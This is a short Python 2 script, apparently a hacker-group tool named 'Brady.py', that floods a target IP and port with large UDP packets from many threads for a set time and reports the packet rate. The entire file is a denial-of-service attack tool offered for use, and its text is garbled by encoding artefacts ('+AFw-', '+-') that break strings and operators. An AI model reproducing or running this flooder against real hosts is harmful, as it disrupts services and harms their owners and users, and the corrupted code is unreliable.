#!/usr/bin/python

#	Tool made by JxckSec Made for Brady.

#	Brady.py

#	Hope you know how to to open it.

import os

import sys

import time

import socket

import random

from threading import Thread

ip=sys.argv[1]

port=int(sys.argv[2])

threads=int(sys.argv[3])

endtime=int(sys.argv[4])

def udp(ip,port,floodtime):

	global packets

	global threads

	global endtime

	packets=0

	data="+AFw-xFF"*65500

	while floodtime>=time.clock():

		s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

		if port==0:

			randport=random.randrange(1,65500)

			s.sendto(data,(ip,randport))

		else:

			s.sendto(data,(ip,port))

		packets+-=1

	print "Thread "+-str(threads)+-" Stopping..."

	threads-=1

for i in xrange(0,threads):

	t=Thread(target=(udp),args=(ip,port,endtime))

	t.start()

time.sleep(endtime)

while threads>=1:

	print "Waiting for "+-str(threads)+-" threads to finish..."

	time.sleep(1)

print "Sent "+-str(packets)+-" packets, averaging at +AH4"+-str(packets/16/endtime)+-" MB/s!"

exit()

